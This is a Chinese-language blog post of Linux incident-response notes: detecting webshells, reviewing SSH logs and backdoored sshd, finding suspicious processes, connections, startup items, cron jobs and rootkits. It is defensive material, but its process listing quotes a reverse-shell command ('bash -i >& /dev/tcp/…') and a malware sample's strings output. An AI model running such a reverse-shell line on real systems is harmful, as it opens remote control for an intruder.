<!DOCTYPE html>












  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#fff">












<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">



















  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="https://fonts.loli.net/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=6.4.1" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.1">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/fish-32x32.png?v=6.4.1">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/fish-16x16.png?v=6.4.1">


  <link rel="mask-icon" href="/images/logo.svg?v=6.4.1" color="#fff">



  <meta name="msapplication-config" content="/images/browserconfig.xml">







<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '6.4.1',
    sidebar: {"position":"right","display":"hide","offset":12,"b2t":false,"scrollpercent":true,"onmobile":true},
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta name="description" content="0x01 Web服务1) 检测最近创建的文件和上传目录 1234567#查找24小时内被修改的php文件find ./ -mtime 0 -name &quot;*.php&quot;# n+1天前find ./ -mtime +n -name &quot;*.php&quot; # n天内find ./ -mtime -n -name &quot;*.php&quot;#具体还有 atime ctime  2) 与测试环境目录做对比 1diff -r &amp;">
<meta name="keywords" content="Hexo,博客">
<meta property="og:type" content="article">
<meta property="og:title" content="应急响应整理">
<meta property="og:url" content="https://yingyingguaier.github.io/2019/04/21/应急响应整理/index.html">
<meta property="og:site_name" content="0menc&#39;s Blog">
<meta property="og:description" content="0x01 Web服务1) 检测最近创建的文件和上传目录 1234567#查找24小时内被修改的php文件find ./ -mtime 0 -name &quot;*.php&quot;# n+1天前find ./ -mtime +n -name &quot;*.php&quot; # n天内find ./ -mtime -n -name &quot;*.php&quot;#具体还有 atime ctime  2) 与测试环境目录做对比 1diff -r &amp;">
<meta property="og:locale" content="zh-Hans">
<meta property="og:updated_time" content="2019-06-19T17:23:13.403Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="应急响应整理">
<meta name="twitter:description" content="0x01 Web服务1) 检测最近创建的文件和上传目录 1234567#查找24小时内被修改的php文件find ./ -mtime 0 -name &quot;*.php&quot;# n+1天前find ./ -mtime +n -name &quot;*.php&quot; # n天内find ./ -mtime -n -name &quot;*.php&quot;#具体还有 atime ctime  2) 与测试环境目录做对比 1diff -r &amp;">






  <link rel="canonical" href="https://yingyingguaier.github.io/2019/04/21/应急响应整理/">



<script type="text/javascript" id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>应急响应整理 | 0menc's Blog</title>
  









  <noscript>
  <style type="text/css">
    .use-motion .motion-element,
    .use-motion .brand,
    .use-motion .menu-item,
    .sidebar-inner,
    .use-motion .post-block,
    .use-motion .pagination,
    .use-motion .comments,
    .use-motion .post-header,
    .use-motion .post-body,
    .use-motion .collection-title { opacity: initial; }

    .use-motion .logo,
    .use-motion .site-title,
    .use-motion .site-subtitle {
      opacity: initial;
      top: initial;
    }

    .use-motion {
      .logo-line-before i { left: initial; }
      .logo-line-after i { right: initial; }
    }
  </style>
</noscript>

</head>
<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-right page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">0menc's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
      
        <p class="site-subtitle">学习、踩坑及经验分享</p>
      
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Toggle navigation bar">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">
    <a href="/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-about">
    <a href="/about/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">
    <a href="/tags/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-categories">
    <a href="/categories/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">
    <a href="/archives/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-commonweal">
    <a href="/404.html" rel="section">
      <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br>Commonweal 404</a>
  </li>

      
      
    </ul>
  

  
    

  

  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://yingyingguaier.github.io/2019/04/21/应急响应整理/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="嘤嘤怪er">
      <meta itemprop="description" content="0menc">
      <meta itemprop="image" content="/images/jack.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="0menc's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">应急响应整理
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2019-04-21 17:37:15" itemprop="dateCreated datePublished" datetime="2019-04-21T17:37:15+08:00">2019-04-21</time>
            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/应急响应/" itemprop="url" rel="index"><span itemprop="name">应急响应</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="0x01-Web服务"><a href="#0x01-Web服务" class="headerlink" title="0x01 Web服务"></a>0x01 Web服务</h1><p>1) 检测最近创建的文件和上传目录</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">查找24小时内被修改的php文件</span></span><br><span class="line">find ./ -mtime 0 -name "*.php"</span><br><span class="line"><span class="meta">#</span><span class="bash"> n+1天前</span></span><br><span class="line">find ./ -mtime +n -name "*.php" </span><br><span class="line"><span class="meta">#</span><span class="bash"> n天内</span></span><br><span class="line">find ./ -mtime -n -name "*.php"</span><br><span class="line"><span class="meta">#</span><span class="bash">具体还有 atime ctime</span></span><br></pre></td></tr></table></figure>

<p>2) 与测试环境目录做对比</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diff -r &#123;生产dir&#125; &#123;测试dir&#125;</span><br></pre></td></tr></table></figure>

<p>3) 使用Webshell查杀工具</p>
<p>Windows下D盾等，Linux下河马等。</p>
<p>4) 创建Audit审计规则</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/audit/audit.rules</span><br><span class="line">-a exclude,always -F msgtype=CONFIG_CHANGE</span><br><span class="line">-a exit,always -F arch=b64 -F uid=48 -S execve -k webshell</span><br></pre></td></tr></table></figure>

<p>1）扫描特征</p>
<p>通常入侵行为会伴随着踩点和扫描行为，那么可以查一下具有扫描行为的日志。</p>
<p>例如使用AWVS扫描：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep 'acunetix' /var/log/httpd/access_log</span><br></pre></td></tr></table></figure>

<p>例如使用sqlmap，但是没有使用–random-agent，UA中带有sqlmap</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep 'sqlmap' /var/log/httpd/access_log</span><br></pre></td></tr></table></figure>

<p>2）孤立页面</p>
<p>referer为 – 的php页面</p>
<p>3）Content-Length</p>
<p>攻击者打包回传，过滤Content-Length大于5M的日志</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk '&#123;if($10&gt;5000000)&#123;print $0&#125;&#125;' /var/log/httpd/access_log</span><br></pre></td></tr></table></figure>

<p>需要注意这里如果发现疑似Webshell文件，先用stat记录下时间点，不要直接用vim查看编辑文件内容，这样会更改文件的mtime，对于应急响应来说，时间点很重要。对比时间点更容易在Log找到其他的攻击痕迹。</p>
<h1 id="0x02-SSH服务"><a href="#0x02-SSH服务" class="headerlink" title="0x02 SSH服务"></a>0x02 SSH服务</h1><p>1)  系统账号情况</p>
<ol>
<li>查看特权用户</li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F: '$3==0&#123;print $1&#125;' /etc/passwd</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>查看可以远程登录的帐号信息</li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk '/\$1|\$6/&#123;print $1&#125;' /etc/shadow</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>sudo权限权限用户，非必须可删除<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">more /etc/sudoers | grep -v "^#\|^$" | grep "ALL=(ALL)"</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>2）登录情况</p>
<ol>
<li>查看失败次数</li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -o "Failed password" /var/log/secure|uniq -c</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>输出登录爆破的第一行和最后一行，确认爆破时间范围</li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep "Failed password" /var/log/secure|head -1</span><br><span class="line">grep "Failed password" /var/log/secure|tail -1</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><p>定位爆破ip</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep "Failed password" /var/log/secure|grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)"|uniq -c | sort -nr</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看爆破用户名字典</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep "Failed password" /var/log/secure| perl -e 'while($_=&lt;&gt;)&#123; /for(.*?) from/; print "$1\n";&#125;' |uniq -c|sort -nr</span><br></pre></td></tr></table></figure>
</li>
<li><p>登录成功：</p>
<p>登录成功的日期、用户名、IP</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep "Accepted " /var/log/secure | awk '&#123;print $1,$2,$3,$9,$11&#125;'</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>​            登录成功的IP</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep 'Accepted' /var/log/secure | awk '&#123;print $11&#125;' | sort | uniq -c | sort -nr</span><br></pre></td></tr></table></figure>

<p>​            或者last，它会读取位于/var/log/wtmp的文件。</p>
<ol start="6">
<li>登录失败：</li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep 'Failed' /var/log/secure | awk '&#123;print $11&#125;' | sort | uniq -c | sort -nr</span><br></pre></td></tr></table></figure>

<p>或者lastb，会读取位于/var/log/btmp的文件</p>
<p>3）检查SSH后门方式：</p>
<ol>
<li>比对ssh的版本</li>
</ol>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssh -V</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>查看ssh配置文件和/usr/sbin/sshd的时间</li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stat /etc/ssh/sshd_config</span><br><span class="line">stat /usr/sbin/sshd</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>strings检查/usr/sbin/sshd，看是否有邮箱信息</li>
</ol>
<p>strings可以查看二进制文件中的字符串，在应急响应中是十分有用的。有些sshd后门会通过邮件发送登录信息，通过</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings /usr/sbin/sshd</span><br></pre></td></tr></table></figure>

<p>可以查看到邮箱信息。</p>
<ol start="4">
<li>通过strace监控sshd进程读写文件的操作</li>
</ol>
<p>一般的sshd后门都会将账户密码记录到文件，可以通过strace进程跟踪到ssh登录密码文件。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ps axu | grep sshd | grep -v grep</span><br><span class="line"></span><br><span class="line">root 65530 0.0 0.1 48428 1260 ? Ss 13:43 0:00 /usr/sbin/sshd</span><br><span class="line"></span><br><span class="line">strace -o aa -ff -p 65530</span><br><span class="line"></span><br><span class="line">grep open aa* | grep -v -e No -e null -e denied| grep WR</span><br><span class="line"></span><br><span class="line">aa.102586:open("/tmp/ilog", O_WRONLY|O_CREAT|O_APPEND, 0666) = 4</span><br></pre></td></tr></table></figure>

<h1 id="0x03-进程"><a href="#0x03-进程" class="headerlink" title="0x03 进程"></a>0x03 进程</h1><p>检查是否存在可疑进程，需要注意如果攻击者获取到了Root权限，被植入内核或者系统层Rootkit的话，进程可能会隐藏。</p>
<p>1）系统负载</p>
<p>例如挖矿程序特征就是系统负载高。使用Top命令查看</p>
<p>按照CPU排序：Shift+P</p>
<p>按照MEM排序：Shift+M</p>
<p>2）启动时间</p>
<p>与前面找到的Webshell时间点比对。</p>
<p>3）启动权限</p>
<p>木马进程以mysql权限执行的，可以判断是通过Mysql入侵，重点排查Mysql弱口令、UDF提权等。</p>
<p>4）父进程</p>
<ol>
<li>菜刀中反弹Bash</li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[root@server]#</span><span class="bash">ps -ef | grep <span class="string">'/dev/tcp'</span> | grep -v grep</span></span><br><span class="line"></span><br><span class="line">apache   26641  1014  0 14:59 ?        00:00:00 sh -c /bin/sh -c "cd /root/apache-tomcat-6.0.32/webapps/ROOT/;bash -i &gt;&amp; /dev/tcp/192.168.192.144/2345 0&gt;&amp;1;echo [S];pwd;echo [E]" 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="meta">[root@server]#</span><span class="bash">ps -ef | grep 1014</span></span><br><span class="line">apache    1014  1011  0 Sep19 ?        00:00:00 /usr/sbin/httpd</span><br></pre></td></tr></table></figure>

<p>可以看到父进程为apache，就可以判断攻击者通过Web入侵。</p>
<ol start="2">
<li>lsof -p pid：查看可疑进程打开的文件</li>
</ol>
<p>例如十字病毒，会修改ps和netstat显示的进程名称</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">udp        <span class="number">0</span>      <span class="number">0</span> <span class="number">0.0</span><span class="meta">.0</span><span class="meta">.0</span>:<span class="number">49937</span>               <span class="number">0.0</span><span class="meta">.0</span><span class="meta">.0</span>:*                               <span class="number">131683</span>/ls -la</span><br><span class="line"></span><br><span class="line">udp        <span class="number">0</span>      <span class="number">0</span> <span class="number">0.0</span><span class="meta">.0</span><span class="meta">.0</span>:<span class="number">47584</span>               <span class="number">0.0</span><span class="meta">.0</span><span class="meta">.0</span>:*                               <span class="number">116515</span>/ifconfig</span><br></pre></td></tr></table></figure>

<p>很明显的异常，ls和ifconfig不会存在监听行为。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@DataNode105 admin]# lsof -p 131683</span><br><span class="line"></span><br><span class="line">COMMAND      PID USER   FD   TYPE    DEVICE SIZE/OFF     NODE NAME</span><br><span class="line"></span><br><span class="line">hahidjqzx 131683 root  cwd    DIR      8,98     4096 18087937 /root</span><br><span class="line"></span><br><span class="line">hahidjqzx 131683 root  rtd    DIR      8,98     4096        2 /</span><br><span class="line"></span><br><span class="line">hahidjqzx 131683 root  txt    REG      8,98   625622 24123895 /usr/bin/hahidjqzxs</span><br></pre></td></tr></table></figure>

<p>可疑看到真正的可执行文件是/usr/bin/hahidjqzxs</p>
<ol start="3">
<li>file：查看文件类型：</li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[root@server]#</span><span class="bash"> file .zl</span></span><br><span class="line"></span><br><span class="line">zl: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.9, not stripped</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>strings：显示二进制的文件中可读字符</li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[root@server]#</span><span class="bash"> strings .zl</span></span><br><span class="line"></span><br><span class="line">rm -f /boot/IptabLes ; rm -f /boot/.IptabLes ; rm -f /boot/IptabLex ; rm -f /boot/.IptabLex ; rm -f /usr</span><br><span class="line"></span><br><span class="line">/IptabLes ; rm -f /usr/.IptabLes ; rm -f /usr/IptabLex ; rm -f /usr/.IptabLex</span><br><span class="line"></span><br><span class="line">netstat -anp | grep "IptabLes" |awk '&#123;print $NF&#125;' |cut -d "/" -f 1 | xargs kill -9 &gt; /dev/null ;free -m</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> /dev/null</span></span><br><span class="line"></span><br><span class="line">netstat -anp | grep "IptabLex" |awk '&#123;print $NF&#125;' |cut -d "/" -f 1 | xargs kill -9 &gt; /dev/null ;free -m</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> /dev/null</span></span><br></pre></td></tr></table></figure>

<p>例如之前应急遇到的命令替换，通过Strings查看发现有大量的IP地址，就是明显的异常现象。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[root@server]#</span><span class="bash"> strings /usr/bin/.sshd | egrep <span class="string">'[1-9]&#123;1,3&#125;\.[1-9]&#123;1,3&#125;\.'</span></span></span><br><span class="line">8.8.8.8</span><br><span class="line">8.8.4.4</span><br><span class="line">8.8.8.8</span><br><span class="line">61.132.163.68</span><br><span class="line">202.102.192.68</span><br><span class="line">202.102.213.68</span><br><span class="line">58.242.2.2</span><br><span class="line">202.38.64.1</span><br><span class="line">211.91.88.129</span><br><span class="line">211.138.180.2</span><br><span class="line">218.104.78.2</span><br><span class="line">202.102.199.68</span><br><span class="line">202.175.3.3</span><br></pre></td></tr></table></figure>

<h1 id="0x04-网络连接"><a href="#0x04-网络连接" class="headerlink" title="0x04 网络连接"></a>0x04 网络连接</h1><p>1）短连接</p>
<p>短连接（short connnection）是相对于长连接而言的概念，指的是在数据传送过程中，只在需要发送数据时，才去建立一个连接，数据发送完成后，则断开此连接，即每次连接只完成一项业务的发送。 在系统维护中，一般很难去察觉，需要借助网络安全设备或者抓包分析，才能够去发现。</p>
<p>例：编写脚本捕捉pid和源文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">ip=118.184.15.40</span><br><span class="line">i=1</span><br><span class="line">while :</span><br><span class="line">do</span><br><span class="line">   tmp=`netstat -anplt|grep $ip|awk -F '[/]' '&#123;print $1&#125;'|awk '&#123;print $7&#125;'`</span><br><span class="line"><span class="meta">   #</span><span class="bash"><span class="built_in">echo</span> <span class="variable">$tmp</span></span></span><br><span class="line">   if test -z "$tmp"</span><br><span class="line">   then</span><br><span class="line">       ((i=i+1)) </span><br><span class="line">   else</span><br><span class="line">       for pid in $tmp; do</span><br><span class="line">           echo "PID: "$&#123;pid&#125;</span><br><span class="line">          result=`ls -lh /proc/$pid|grep exe`</span><br><span class="line">          echo "Process: "$&#123;result&#125;</span><br><span class="line">          kill -9 $pid</span><br><span class="line">       done</span><br><span class="line">       break</span><br><span class="line">   fi </span><br><span class="line">done</span><br><span class="line">echo "Total number of times: "$&#123;i&#125;</span><br></pre></td></tr></table></figure>

<p>2）</p>
<p>需要注意如果攻击者获取到了Root权限，被植入内核或者系统层Rootkit的话，连接可能会被隐藏。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp | grep ESTABLISHED</span><br></pre></td></tr></table></figure>

<p>查看已经建立的网络连接，例如反弹bash</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp | grep EST | grep bash</span><br></pre></td></tr></table></figure>

<p>检查可以监听端口</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp | grep LISTEN</span><br></pre></td></tr></table></figure>

<h1 id="0x05-敏感目录"><a href="#0x05-敏感目录" class="headerlink" title="0x05 敏感目录"></a>0x05 敏感目录</h1><p>/tmp, /var/tmp, /dev/shm，所有用户都可读，可写，可执行</p>
<h1 id="0x06-history"><a href="#0x06-history" class="headerlink" title="0x06 history"></a>0x06 history</h1><p>默认的history仅记录执行的命令，然而这些对于应急来说是不够的，很多系统加固脚本会添加记录命令执行的时间，修改记录的最大条数。</p>
<h1 id="0x07-开机启动"><a href="#0x07-开机启动" class="headerlink" title="0x07 开机启动"></a>0x07 开机启动</h1><p>1）CentOS 5系统</p>
<ol>
<li>/etc/inittab<br>该文件是可以运行process</li>
<li>/etc/rc.d/rc.sysinit</li>
<li>/etc/rc.d/init.d</li>
<li>/etc/rc.d/rc.local</li>
</ol>
<p>2） CentOS 6 </p>
<ol>
<li>/etc/init/*.conf</li>
<li>/etc/rc.d/rc.sysinit</li>
<li>/etc/rc.d/init.d</li>
<li>/etc/rc.d/rc.local</li>
</ol>
<p>3） CentOS 6 </p>
<ol>
<li><p>排查修改的service</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find /usr/lib/systemd/system/ -name "*.service" | xargs ls -alt | head -n 5</span><br><span class="line">find /etc/systemd/system/ -name "*.service" | xargs ls -alt | head -n 5</span><br></pre></td></tr></table></figure>
</li>
<li><p>/etc/rc.d/init.d</p>
</li>
<li><p>/etc/rc.d/rc.local<br>不过需要看/etc/rc.d/rc.local是否有x权限。</p>
</li>
</ol>
<h1 id="0x08-定时任务"><a href="#0x08-定时任务" class="headerlink" title="0x08 定时任务"></a>0x08 定时任务</h1><p>一般常用的定时任务crontab -l是用户级别的，保存在/var/spool/cron/{user}，每个用户都可以通过crontab -e编辑自己的定时任务列表。<br>而/etc/crontab是系统级别的定时任务，只有Root账户可以修改。<br>另外在应急的时候需要留意的点还有/etc/cron.hourly, /etc/cron.daily, /etc/cron.weekly,/etc/cron.monthly等周期性执行脚本的目录。</p>
<h1 id="0x09-Rootkit"><a href="#0x09-Rootkit" class="headerlink" title="0x09  Rootkit"></a>0x09  Rootkit</h1><p>Rootkit功能通常有隐藏文件、进程、连接、模块，网络嗅探，后门，日志擦除，键盘记录（SSH密码记录）等。</p>
<p>检查命令替换，比较直观的方式就是比较命令的大小和mtime了。</p>
<p>1）比对命令的大小</p>
<p>2）查看命令的修改时间，按修改时间排序</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -alt /bin/ | head -n 5</span><br></pre></td></tr></table></figure>

<p>而比较全面的检测方式有：</p>
<p>3）rpm -aV</p>
<p>RPM Database 不仅提供了 RPM 包的查询功能，还提供了对已安装的 RPM 包进行验证的功能。默认情况下，RPM Database 存放在 /var/lib/rpm 目录。</p>
<p>需要注意这条命令局限性就是只能检查通过RPM包安装的所有文件。另外为了防止rpm也被替换，上传一个安全干净稳定版本rpm二进制到服务器上进行检查。</p>
<p>我们可以对系统中所有 RPM 文件做一个全面检查</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rpm -aV</span><br><span class="line"><span class="meta">#</span><span class="bash">查看bash</span></span><br><span class="line">rpm -Vf /bin/bash</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">S: 表示文件长度发生了变化</span><br><span class="line">M: 表示文件的访问权限或文件类型发生了变化</span><br><span class="line">5: 表示MD5校验和发生了变化。</span><br><span class="line">D: 表示设备节点的属性发生了变化</span><br><span class="line">L: 表示文件的符号链接发生率变化</span><br><span class="line">U: 表示文件/子目录/设备节点的owner发生了变化</span><br><span class="line">G: 表示文件/子目录/设备节点的group发生了变化</span><br><span class="line">T: 表示文件最后一次的修改时间发生了变化</span><br></pre></td></tr></table></figure>

<p>4）使用chkrootkit和rkhunter查看</p>
